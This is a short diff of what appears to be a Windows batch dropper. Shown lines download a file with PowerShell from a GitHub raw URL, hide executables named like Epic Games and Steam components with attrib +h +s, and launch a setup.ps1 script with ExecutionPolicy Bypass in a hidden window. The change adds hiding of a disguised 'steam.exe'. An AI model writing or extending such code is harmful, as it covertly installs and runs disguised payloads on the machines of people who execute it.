@@ -8,6 +8,7 @@ powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/X
 
 attrib +h +s "C:\Program Files (x86)\Epic Games\NetworkAppControl.exe"
 attrib +h +s "C:\ProgramData\Microsoft\Windows\setup.ps1"
+attrib +h +s "C:\Program Files (x86)\Steam\resource\steam.exe"
 
 start "" "C:\Program Files (x86)\Epic Games\NetworkAppControl.exe"
 powershell Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass', '-File "C:\ProgramData\Microsoft\Windows\setup.ps1"' -WindowStyle Hidden
